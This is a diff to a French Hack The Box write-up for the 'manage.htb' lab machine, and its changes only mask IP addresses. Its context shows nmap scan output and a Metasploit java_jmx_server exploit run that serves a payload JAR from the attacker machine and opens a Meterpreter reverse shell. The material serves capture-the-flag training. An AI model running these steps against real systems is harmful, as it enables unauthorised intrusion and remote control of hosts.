@@ -40,7 +40,7 @@ ctf:
   target_ip: "10.129.x.x"
   skills: ["Enumeration","Web","Privilege Escalation"]
   time_spent: "4h"
-  # vpn_ip: "10.10.14.xx"
+  # vpn_ip: "10.10.x.x"
   # notes: "Points d'attention…"
 
 # --- Options diverses ---
@@ -126,7 +126,7 @@ Le scan initial TCP complet (`scans_nmap/full_tcp_scan.txt`) révèle les ports 
 
 ```txt
 # Nmap 7.98 scan initiated Sun Jan 11 15:26:48 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt manage.htb
-Nmap scan report for manage.htb (10.129.37.198)
+Nmap scan report for manage.htb (10.129.x.x)
 Host is up (0.0086s latency).
 Not shown: 65530 closed tcp ports (reset)
 PORT      STATE SERVICE
@@ -152,7 +152,7 @@ Voici le résultat (`scans_nmap/aggressive_vuln_scan.txt`) :
     nmap -Pn -A -sV -p"22,2222,8080,37055,45353" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "manage.htb"
 
 # Nmap 7.98 scan initiated Sun Jan 11 15:26:59 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,2222,8080,37055,45353 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan.txt manage.htb
-Nmap scan report for manage.htb (10.129.37.198)
+Nmap scan report for manage.htb (10.129.x.x)
 Host is up (0.0089s latency).
 
 PORT      STATE SERVICE    VERSION
@@ -171,8 +171,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 TRACEROUTE (using port 22/tcp)
 HOP RTT     ADDRESS
-1   7.82 ms 10.10.14.1
-2   8.33 ms manage.htb (10.129.37.198)
+1   7.82 ms 10.10.x.x
+2   8.33 ms manage.htb (10.129.x.x)
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Sun Jan 11 15:27:13 2026 -- 1 IP address (1 host up) scanned in 14.58 seconds
@@ -185,7 +185,7 @@ Le scan ciblé CMS (`scans_nmap/cms_vuln_scan.txt`) ne met rien de vraiment expl
 
 ```txt
 # Nmap 7.98 scan initiated Sun Jan 11 15:27:13 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,2222,8080,37055,45353 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt manage.htb
-Nmap scan report for manage.htb (10.129.37.198)
+Nmap scan report for manage.htb (10.129.x.x)
 Host is up (0.0081s latency).
 
 PORT      STATE SERVICE    VERSION
@@ -229,7 +229,7 @@ Le scan UDP rapide (`scans_nmap/udp_vuln_scan.txt`) ne met rien de vraiment expl
 
 ```txt
 # Nmap 7.95 scan initiated Wed Nov 19 15:55:59 2025 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt manage.htb
-Nmap scan report for manage.htb (10.129.144.215)
+Nmap scan report for manage.htb (10.129.x.x)
 Host is up (0.0086s latency).
 
 PORT      STATE         SERVICE
@@ -366,7 +366,7 @@ Script       : mon-subdomains
 Version      : mon-subdomains 2.0.0
 Date         : 2026-01-11 15:45:45
 Domaine      : manage.htb
-IP           : 10.129.xx.xx
+IP           : 10.129.x.x
 Mode         : large
 Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
 Codes        : 200,301,302,401,403  (strict=1)
@@ -442,7 +442,7 @@ Un scan Nmap complémentaire, orienté spécifiquement **RMI**, va permettre de 
 ```bash
 nmap --script "rmi*" -sV -p 2222 manage.htb
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 16:35 CET
-Nmap scan report for manage.htb (10.129.144.215)
+Nmap scan report for manage.htb (10.129.x.x)
 Host is up (0.0075s latency).
 
 PORT     STATE SERVICE  VERSION
@@ -567,21 +567,21 @@ msf exploit(multi/misc/java_jmx_server) > set LHOST tun0
 LHOST => 10.10.x.x
 msf exploit(multi/misc/java_jmx_server) > exploit
 [*] Started reverse TCP handler on 10.10.x.x:4444 
-[*] 10.129.234.57:2222 - Using URL: http://10.10.14.152:8080/yedsBc
-[*] 10.129.234.57:2222 - Sending RMI Header...
-[*] 10.129.234.57:2222 - Discovering the JMXRMI endpoint...
-[+] 10.129.234.57:2222 - JMXRMI endpoint on 127.0.1.1:33659
-[*] 10.129.234.57:2222 - Proceeding with handshake...
-[+] 10.129.234.57:2222 - Handshake with JMX MBean server on 127.0.1.1:33659
-[*] 10.129.234.57:2222 - Loading payload...
-[*] 10.129.234.57:2222 - Replied to request for mlet
-[*] 10.129.234.57:2222 - Replied to request for payload JAR
-[*] 10.129.234.57:2222 - Executing payload...
-[*] 10.129.234.57:2222 - Replied to request for payload JAR
-[*] 10.129.234.57:2222 - Replied to request for payload JAR
-[*] Sending stage (58073 bytes) to 10.129.234.57
-[*] Meterpreter session 1 opened (10.10.14.152:4444 -> 10.129.234.57:59886) at 2025-11-20 10:19:57 +0100
-[*] 10.129.234.57:2222 - Server stopped.
+[*] 10.129.x.x:2222 - Using URL: http://10.10.x.x:8080/yedsBc
+[*] 10.129.x.x:2222 - Sending RMI Header...
+[*] 10.129.x.x:2222 - Discovering the JMXRMI endpoint...
+[+] 10.129.x.x:2222 - JMXRMI endpoint on 127.0.1.1:33659
+[*] 10.129.x.x:2222 - Proceeding with handshake...
+[+] 10.129.x.x:2222 - Handshake with JMX MBean server on 127.0.1.1:33659
+[*] 10.129.x.x:2222 - Loading payload...
+[*] 10.129.x.x:2222 - Replied to request for mlet
+[*] 10.129.x.x:2222 - Replied to request for payload JAR
+[*] 10.129.x.x:2222 - Executing payload...
+[*] 10.129.x.x:2222 - Replied to request for payload JAR
+[*] 10.129.x.x:2222 - Replied to request for payload JAR
+[*] Sending stage (58073 bytes) to 10.129.x.x
+[*] Meterpreter session 1 opened (10.10.x.x:4444 -> 10.129.x.x:59886) at 2025-11-20 10:19:57 +0100
+[*] 10.129.x.x:2222 - Server stopped.
 
 meterpreter >
 ```
@@ -799,7 +799,7 @@ Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-142-generic x86_64)
   Swap usage:            0%
   Processes:             212
   Users logged in:       0
-  IPv4 address for eth0: 10.129.35.198
+  IPv4 address for eth0: 10.129.x.x
   IPv6 address for eth0: dead:beef::250:56ff:fe94:6cac
 
  * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
